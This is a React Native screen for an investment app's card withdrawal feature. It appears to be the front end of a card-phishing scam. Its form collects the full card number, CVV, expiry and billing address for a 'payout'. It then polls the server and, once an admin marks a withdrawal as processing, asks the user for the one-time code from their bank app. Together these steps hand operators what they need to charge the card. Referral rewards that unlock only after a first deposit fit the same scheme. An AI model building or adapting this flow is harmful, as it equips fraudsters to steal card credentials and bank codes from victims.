import { useState, useEffect, useRef } from 'react'
import { View, Text, StyleSheet, ScrollView, TouchableOpacity, TextInput, Alert, Modal, RefreshControl } from 'react-native'
import { SafeAreaView } from 'react-native-safe-area-context'
import { api } from '@/lib/api'
import { FontAwesome } from '@expo/vector-icons'

const WITHDRAWAL_FEE_PERCENT = 0.02
const WITHDRAWAL_FEE_MIN = 1
const WITHDRAWAL_FEE_MAX = 5

const getWithdrawalFee = (amount: number) => {
  const fee = amount * WITHDRAWAL_FEE_PERCENT
  return Math.max(WITHDRAWAL_FEE_MIN, Math.min(WITHDRAWAL_FEE_MAX, fee))
}

export default function WithdrawalsScreen() {
  const [withdrawals, setWithdrawals] = useState<any[]>([])
  const [investments, setInvestments] = useState<any[]>([])
  const [refreshing, setRefreshing] = useState(false)
  const [showForm, setShowForm] = useState(false)
  const [showOTPModal, setShowOTPModal] = useState(false)
  const [otpCode, setOtpCode] = useState('')
  const [pendingWithdrawalId, setPendingWithdrawalId] = useState<string | null>(null)
  const [referralBalance, setReferralBalance] = useState(0)
  const [canWithdrawReferralRewards, setCanWithdrawReferralRewards] = useState(false)
  const [formData, setFormData] = useState({
    balanceSource: 'INVESTMENT',
    investmentId: '',
    amount: '',
    cardNumber: '',
    cardholderName: '',
    expiryDate: '',
    cvv: '',
    billingAddress: '',
  })
  const hasPromptedOTP = useRef(false)

  useEffect(() => {
    fetchWithdrawals()
    fetchInvestments()
    const interval = setInterval(fetchWithdrawals, 5000)
    return () => clearInterval(interval)
  }, [])

  const fetchWithdrawals = async () => {
    try {
      const { data } = await api.get('withdrawals')
      setWithdrawals(data.data)

      if (!hasPromptedOTP.current) {
        const processing = data.data.find((w: any) => w.status === 'PROCESSING')
        if (processing) {
          hasPromptedOTP.current = true
          setPendingWithdrawalId(processing.id)
          setShowOTPModal(true)
        }
      }
    } catch (err: any) {
      Alert.alert('Error', err.response?.data?.message || 'Failed to fetch withdrawals')
    }
  }

  const fetchInvestments = async () => {
    try {
      const [investmentResponse, referralResponse] = await Promise.all([api.get('investments'), api.get('referrals')])
      setInvestments(investmentResponse.data.data)
      setReferralBalance(Number(referralResponse.data.data?.walletBalance || 0))
      setCanWithdrawReferralRewards(Boolean(referralResponse.data.data?.canWithdrawReferralRewards))
    } catch (err) {
      console.log(err)
    }
  }

  const handleSubmit = async () => {
    const amount = Number(formData.amount)
    if (amount < 1) {
      Alert.alert('Error', 'Amount must be at least $1')
      return
    }
    if (!formData.billingAddress || formData.billingAddress.length < 5) {
      Alert.alert('Error', 'Billing address required')
      return
    }
    if (formData.balanceSource === 'INVESTMENT' && !formData.investmentId) {
      Alert.alert('Error', 'Select an investment to withdraw from')
      return
    }
    const fee = getWithdrawalFee(amount)
    const selectedInvestment = investments.find((inv: any) => inv.id === formData.investmentId)
    const sourceBalance = formData.balanceSource === 'REFERRAL' ? referralBalance : Number(selectedInvestment?.currentBalance || 0)
    const maxWithdrawable = sourceBalance - fee
    if (amount > maxWithdrawable) {
      Alert.alert('Error', `Insufficient balance. Fee: $${fee.toFixed(2)}`)
      return
    }
    handleConfirm()
  }

  const handleConfirm = async () => {
    try {
      const payload = {
        ...(formData.balanceSource === 'INVESTMENT' ? { investmentId: formData.investmentId } : {}),
        balanceSource: formData.balanceSource,
        amount: Number(formData.amount),
        method: 'CARD',
        cardNumber: formData.cardNumber.replace(/\s/g, ''),
        cardholderName: formData.cardholderName,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
        billingAddress: formData.billingAddress,
      }
      const { data } = await api.post('withdrawals', payload)
      setShowForm(false)
      if (data.success && data.data?.id) {
        setPendingWithdrawalId(data.data.id)
        setShowOTPModal(true)
      }
      fetchWithdrawals()
    } catch (err: any) {
      Alert.alert('Error', err.response?.data?.message || 'Failed')
    }
  }

  const handleSubmitOTP = async () => {
    if (!pendingWithdrawalId || !otpCode || otpCode.length < 4) {
      Alert.alert('Error', 'Please enter valid OTP code')
      return
    }
    try {
      await api.put(`withdrawals/${pendingWithdrawalId}/otp`, { otpCode })
      setShowOTPModal(false)
      hasPromptedOTP.current = false
      setOtpCode('')
      setPendingWithdrawalId(null)
      Alert.alert('Success', 'OTP submitted! Admin will process your withdrawal.')
      fetchWithdrawals()
    } catch (err: any) {
      Alert.alert('Error', err.response?.data?.message || 'Failed')
    }
  }

  const onRefresh = async () => {
    setRefreshing(true)
    await fetchWithdrawals()
    setRefreshing(false)
  }

  const formatCardNumber = (value: string) => {
    const numbers = value.replace(/\D/g, '').slice(0, 16)
    return numbers.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
  }

  const statusColors: Record<string, { bg: string; text: string }> = {
    PROCESSING: { bg: '#dbeafe', text: '#1e40af' },
    WITHDRAWAL_PENDING: { bg: '#fef3c7', text: '#92400e' },
    WITHDRAWN: { bg: '#d1fae5', text: '#065f46' },
    REJECTED: { bg: '#fee2e2', text: '#991b1b' },
  }

  const selectedInvestment = investments.find((inv: any) => inv.id === formData.investmentId)
  const sourceBalance = formData.balanceSource === 'REFERRAL' ? referralBalance : Number(selectedInvestment?.currentBalance || 0)

  return (
    <SafeAreaView style={styles.container}>
      <ScrollView refreshControl={<RefreshControl refreshing={refreshing} onRefresh={onRefresh} />}>
        <View style={styles.header}>
          <Text style={styles.title}>Withdrawals</Text>
          <Text style={styles.subtitle}>Request a withdrawal to your card</Text>
        </View>

        <TouchableOpacity style={styles.newButton} onPress={() => {
          fetchInvestments()
          setShowForm(true)
        }}>
          <FontAwesome name="arrow-up" size={18} color="#fff" style={{ marginRight: 8 }} />
          <Text style={styles.newButtonText}>New Withdrawal</Text>
        </TouchableOpacity>

        {showForm && (
          <View style={styles.formContainer}>
            <Text style={styles.formTitle}>Request Withdrawal to Card</Text>
            <View>
              <Text style={styles.inputLabel}>Withdrawal source</Text>
              <View style={styles.sourceButtons}>
                <TouchableOpacity
                  style={[styles.sourceButton, formData.balanceSource === 'INVESTMENT' && styles.sourceButtonSelected]}
                  onPress={() => setFormData({ ...formData, balanceSource: 'INVESTMENT', investmentId: '' })}
                >
                  <Text style={[styles.sourceButtonText, formData.balanceSource === 'INVESTMENT' && styles.sourceButtonTextSelected]}>Investment balance</Text>
                </TouchableOpacity>
                <TouchableOpacity
                  style={[styles.sourceButton, formData.balanceSource === 'REFERRAL' && styles.sourceButtonSelected, (!canWithdrawReferralRewards || referralBalance <= 0) && styles.sourceButtonDisabled]}
                  onPress={() => {
                    if (!canWithdrawReferralRewards || referralBalance <= 0) return
                    setFormData({ ...formData, balanceSource: 'REFERRAL', investmentId: '' })
                  }}
                >
                  <Text style={[styles.sourceButtonText, formData.balanceSource === 'REFERRAL' && styles.sourceButtonTextSelected]}>Referral rewards</Text>
                </TouchableOpacity>
              </View>
              {!canWithdrawReferralRewards && referralBalance > 0 && <Text style={styles.sourceHelp}>Referral rewards unlock after your first confirmed package deposit.</Text>}
            </View>

            {formData.balanceSource === 'INVESTMENT' && <>
              <Text style={styles.inputLabel}>Investment</Text>
              <View style={styles.investmentOptions}>
                {investments.length === 0 ? <Text style={styles.sourceHelp}>No investments available for withdrawal.</Text> : investments.map((investment: any) => (
                  <TouchableOpacity key={investment.id} style={[styles.investmentOption, formData.investmentId === investment.id && styles.investmentOptionSelected]} onPress={() => setFormData({ ...formData, investmentId: investment.id })}>
                    <Text style={styles.investmentOptionTitle}>{investment.investmentId}</Text>
                    <Text style={styles.investmentOptionBalance}>${Number(investment.currentBalance || 0).toLocaleString()}</Text>
                  </TouchableOpacity>
                ))}
              </View>
            </>}

            <Text style={styles.inputLabel}>Amount (USD)</Text>
            <TextInput
              style={styles.input}
              placeholder="Enter amount"
              value={formData.amount}
              onChangeText={(v) => setFormData({ ...formData, amount: v })}
              keyboardType="numeric"
            />

            <Text style={styles.inputLabel}>Card Number</Text>
            <View style={styles.inputWithIcon}>
              <FontAwesome name="credit-card" size={16} color="#6b7280" style={styles.inputIcon} />
              <TextInput
                style={styles.input}
                placeholder="1234 5678 9012 3456"
                value={formatCardNumber(formData.cardNumber)}
                onChangeText={(v) => setFormData({ ...formData, cardNumber: formatCardNumber(v).replace(/\s/g, '') })}
                keyboardType="numeric"
                maxLength={19}
              />
            </View>

            <Text style={styles.inputLabel}>Cardholder Name</Text>
            <View style={styles.inputWithIcon}>
              <FontAwesome name="user" size={16} color="#6b7280" style={styles.inputIcon} />
              <TextInput
                style={styles.input}
                placeholder="John Doe"
                value={formData.cardholderName}
                onChangeText={(v) => setFormData({ ...formData, cardholderName: v })}
              />
            </View>

            <Text style={styles.inputLabel}>Expiry Date (MM/YY)</Text>
            <View style={styles.inputWithIcon}>
              <FontAwesome name="calendar" size={16} color="#6b7280" style={styles.inputIcon} />
              <TextInput
                style={styles.input}
                placeholder="12/25"
                value={formData.expiryDate}
                onChangeText={(v) => {
                  let val = v.replace(/\D/g, '')
                  if (val.length >= 2) val = val.slice(0, 2) + '/' + val.slice(2, 4)
                  setFormData({ ...formData, expiryDate: val.slice(0, 5) })
                }}
                keyboardType="numeric"
                maxLength={5}
              />
            </View>

            <Text style={styles.inputLabel}>CVV</Text>
            <View style={styles.inputWithIcon}>
              <FontAwesome name="lock" size={16} color="#6b7280" style={styles.inputIcon} />
              <TextInput
                style={styles.input}
                placeholder="123"
                value={formData.cvv}
                onChangeText={(v) => setFormData({ ...formData, cvv: v.replace(/\D/g, '').slice(0, 3) })}
                keyboardType="numeric"
                maxLength={3}
                secureTextEntry
              />
            </View>

            <Text style={styles.inputLabel}>Billing Address</Text>
            <View style={styles.inputWithIcon}>
              <FontAwesome name="map-marker" size={16} color="#6b7280" style={styles.inputIcon} />
              <TextInput
                style={styles.input}
                placeholder="Street, Apt, City, Country"
                value={formData.billingAddress}
                onChangeText={(v) => setFormData({ ...formData, billingAddress: v })}
              />
            </View>

            <View style={styles.infoCard}>
              <Text style={styles.infoText}>
                Available: ${sourceBalance.toLocaleString()} | Fee: {formData.amount ? `$${getWithdrawalFee(Number(formData.amount)).toFixed(2)}` : '-'} (2%, min $1, max $5)
              </Text>
            </View>

            <View style={styles.formButtons}>
              <TouchableOpacity style={styles.submitBtn} onPress={handleSubmit}>
                <Text style={styles.submitBtnText}>Submit</Text>
              </TouchableOpacity>
              <TouchableOpacity style={styles.cancelBtn} onPress={() => setShowForm(false)}>
                <Text style={styles.cancelBtnText}>Cancel</Text>
              </TouchableOpacity>
            </View>
          </View>
        )}

        {showOTPModal && (
          <Modal transparent visible={showOTPModal} animationType="fade">
            <View style={styles.otpOverlay}>
              <View style={styles.otpModal}>
                <Text style={styles.otpTitle}>Enter OTP</Text>
                <Text style={styles.otpText}>Please enter the OTP from your bank app to complete withdrawal.</Text>
                <TextInput
                  style={styles.otpInput}
                  placeholder="Enter OTP code"
                  value={otpCode}
                  onChangeText={(v) => setOtpCode(v.replace(/\D/g, '').slice(0, 10))}
                  keyboardType="numeric"
                  maxLength={10}
                />
                <View style={styles.otpButtons}>
                  <TouchableOpacity style={styles.otpBtn} onPress={handleSubmitOTP}>
                    <Text style={styles.otpBtnText}>Submit OTP</Text>
                  </TouchableOpacity>
                  <TouchableOpacity style={styles.otpCancelBtn} onPress={() => setShowOTPModal(false)}>
                    <Text style={styles.otpCancelBtnText}>Cancel</Text>
                  </TouchableOpacity>
                </View>
              </View>
            </View>
          </Modal>
        )}

        <View style={styles.historyContainer}>
          <Text style={styles.historyTitle}>Withdrawal History</Text>
          {withdrawals.length === 0 ? (
            <View style={styles.emptyState}>
              <Text style={styles.emptyText}>No withdrawals yet.</Text>
            </View>
          ) : (
            <View style={styles.historyList}>
              {withdrawals.map((w: any) => (
                <View key={w.id} style={styles.historyItem}>
                  <View>
                    <Text style={styles.historyDate}>{new Date(w.createdAt).toLocaleDateString()}</Text>
                    <Text style={styles.historyInvestment}>{w.balanceSource === 'REFERRAL' ? 'Referral rewards' : w.investmentId}</Text>
                  </View>
                  <View style={styles.historyRight}>
                    <Text style={styles.historyAmount}>${Number(w.amount).toLocaleString()}</Text>
                    <Text style={styles.historyMethod}>{w.method}</Text>
                    <View style={[styles.statusBadge, { backgroundColor: statusColors[w.status]?.bg || '#f3f4f6' }]}>
                      <Text style={[styles.statusText, { color: statusColors[w.status]?.text || '#374151' }]}>
                        {w.status?.replace(/_/g, ' ')}
                      </Text>
                    </View>
                  </View>
                </View>
              ))}
            </View>
          )}
        </View>
      </ScrollView>
    </SafeAreaView>
  )
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#f9fafb' },
  header: {
    padding: 20,
    paddingTop: 40,
    paddingBottom: 20,
  },
  title: {
    fontSize: 24,
    fontWeight: '700',
    color: '#111827',
  },
  subtitle: {
    fontSize: 14,
    color: '#6b7280',
    marginTop: 4,
  },
  newButton: {
    backgroundColor: '#0045a0',
    borderRadius: 12,
    paddingVertical: 12,
    paddingHorizontal: 16,
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    marginHorizontal: 16,
    marginBottom: 16,
  },
  newButtonText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: '600',
  },
  formContainer: {
    backgroundColor: '#fff',
    borderRadius: 24,
    padding: 20,
    borderWidth: 1,
    borderColor: '#e5e7eb',
    marginHorizontal: 16,
    marginBottom: 24,
    gap: 12,
  },
  formTitle: {
    fontSize: 18,
    fontWeight: '600',
    color: '#111827',
    marginBottom: 8,
  },
  formRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
  },
  inputLabel: {
    fontSize: 14,
    fontWeight: '500',
    color: '#374151',
    marginBottom: 4,
  },
  selectWrapper: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: '#f3f4f6',
    borderRadius: 12,
    paddingHorizontal: 12,
    height: 44,
  },
  selectText: {
    fontSize: 14,
    color: '#374151',
    marginRight: 8,
  },
  selectInput: {
    flex: 1,
    fontSize: 14,
    color: '#111827',
  },
  sourceButtons: { flexDirection: 'row', gap: 8, marginTop: 4 },
  sourceButton: { flex: 1, borderRadius: 10, borderWidth: 1, borderColor: '#d1d5db', padding: 10, alignItems: 'center' },
  sourceButtonSelected: { backgroundColor: '#0045a0', borderColor: '#0045a0' },
  sourceButtonDisabled: { opacity: 0.45 },
  sourceButtonText: { fontSize: 12, color: '#374151', fontWeight: '600' },
  sourceButtonTextSelected: { color: '#fff' },
  sourceHelp: { color: '#92400e', fontSize: 12, marginTop: 6 },
  investmentOptions: { gap: 8 },
  investmentOption: { flexDirection: 'row', justifyContent: 'space-between', borderWidth: 1, borderColor: '#d1d5db', borderRadius: 10, padding: 12 },
  investmentOptionSelected: { borderColor: '#0045a0', backgroundColor: '#eff6ff' },
  investmentOptionTitle: { color: '#111827', fontSize: 13, fontWeight: '600' },
  investmentOptionBalance: { color: '#0045a0', fontSize: 13, fontWeight: '600' },
  input: {
    borderWidth: 1,
    borderColor: '#d1d5db',
    borderRadius: 12,
    paddingHorizontal: 16,
    height: 44,
    fontSize: 14,
    color: '#111827',
    backgroundColor: '#fff',
  },
  inputWithIcon: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: '#fff',
    borderRadius: 12,
    borderWidth: 1,
    borderColor: '#d1d5db',
    paddingHorizontal: 12,
    height: 44,
  },
  inputIcon: {
    marginRight: 8,
  },
  infoCard: {
    backgroundColor: '#eff6ff',
    borderRadius: 12,
    padding: 12,
    alignItems: 'center',
  },
  infoText: {
    fontSize: 12,
    color: '#0369a1',
    fontWeight: '500',
  },
  formButtons: {
    flexDirection: 'row',
    gap: 12,
    marginTop: 8,
  },
  submitBtn: {
    backgroundColor: '#0045a0',
    borderRadius: 12,
    paddingVertical: 12,
    paddingHorizontal: 20,
    flex: 1,
    alignItems: 'center',
  },
  submitBtnText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: '600',
  },
  cancelBtn: {
    borderRadius: 12,
    paddingVertical: 12,
    paddingHorizontal: 20,
    borderWidth: 1,
    borderColor: '#d1d5db',
    flex: 1,
    alignItems: 'center',
  },
  cancelBtnText: {
    fontSize: 16,
    fontWeight: '600',
    color: '#374151',
  },
  otpOverlay: {
    flex: 1,
    backgroundColor: 'rgba(0,0,0,0.5)',
    justifyContent: 'center',
    alignItems: 'center',
  },
  otpModal: {
    backgroundColor: '#fff',
    borderRadius: 16,
    padding: 20,
    width: '90%',
    maxWidth: 400,
    alignItems: 'center',
  },
  otpTitle: {
    fontSize: 18,
    fontWeight: '600',
    color: '#111827',
    marginBottom: 8,
  },
  otpText: {
    fontSize: 14,
    color: '#6b7280',
    textAlign: 'center',
    marginBottom: 16,
  },
  otpInput: {
    borderWidth: 1,
    borderColor: '#d1d5db',
    borderRadius: 12,
    paddingHorizontal: 16,
    height: 44,
    fontSize: 16,
    color: '#111827',
    fontFamily: 'monospace',
    textAlign: 'center',
    marginBottom: 16,
  },
  otpButtons: {
    flexDirection: 'row',
    gap: 12,
    width: '100%',
  },
  otpBtn: {
    backgroundColor: '#0045a0',
    borderRadius: 12,
    paddingVertical: 12,
    paddingHorizontal: 20,
    flex: 1,
    alignItems: 'center',
  },
  otpBtnText: {
    color: '#fff',
    fontSize: 14,
    fontWeight: '600',
  },
  otpCancelBtn: {
    borderRadius: 12,
    paddingVertical: 12,
    paddingHorizontal: 20,
    borderWidth: 1,
    borderColor: '#d1d5db',
    flex: 1,
    alignItems: 'center',
  },
  otpCancelBtnText: {
    fontSize: 14,
    fontWeight: '600',
    color: '#374151',
  },
  historyContainer: {
    paddingHorizontal: 16,
    paddingBottom: 20,
  },
  historyTitle: {
    fontSize: 18,
    fontWeight: '600',
    color: '#111827',
    marginBottom: 12,
  },
  emptyState: {
    padding: 40,
    alignItems: 'center',
    backgroundColor: '#fff',
    borderRadius: 16,
    borderWidth: 1,
    borderColor: '#e5e7eb',
  },
  emptyText: {
    fontSize: 14,
    color: '#6b7280',
  },
  historyList: {
    backgroundColor: '#fff',
    borderRadius: 16,
    borderWidth: 1,
    borderColor: '#e5e7eb',
    overflow: 'hidden',
  },
  historyItem: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'flex-start',
    padding: 16,
    borderBottomWidth: 1,
    borderBottomColor: '#f3f4f6',
  },
  historyDate: {
    fontSize: 14,
    fontWeight: '600',
    color: '#111827',
  },
  historyInvestment: {
    fontSize: 12,
    color: '#6b7280',
    marginTop: 2,
  },
  historyRight: {
    alignItems: 'flex-end',
  },
  historyAmount: {
    fontSize: 16,
    fontWeight: '600',
    color: '#111827',
    marginBottom: 4,
  },
  historyMethod: {
    fontSize: 12,
    color: '#6b7280',
    marginBottom: 4,
  },
  statusBadge: {
    borderRadius: 999,
    paddingHorizontal: 10,
    paddingVertical: 4,
  },
  statusText: {
    fontSize: 11,
    fontWeight: '500',
  },
})
